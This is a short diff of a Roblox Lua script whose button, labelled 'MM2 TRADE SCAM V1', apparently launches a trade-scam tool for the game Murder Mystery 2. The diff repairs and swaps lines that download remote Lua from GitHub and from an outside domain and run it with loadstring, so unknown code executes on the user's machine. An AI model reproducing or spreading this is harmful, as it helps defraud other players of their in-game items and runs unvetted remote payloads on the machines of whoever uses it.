@@ -7,9 +7,9 @@ tab.newButton(
     "MM2 TRADE SCAM V1🔥✅",
     "Status: 🟢 Around 25 seconds to load but it's alr ^^",
     function()
-        loadstring(kgame:HttpGet("https://raw.githubusercontent.com/BoiFreedom/V2-UI/refs/heads/main/MM2"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/V2-UI/refs/heads/main/MM2"))()
 
-loadstring(game:HttpGet("https://egorikusa.space/c89b6880e2b292dc61362cb7.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/New/refs/heads/main/Vegur", true))()
     end
 )
-hb
+
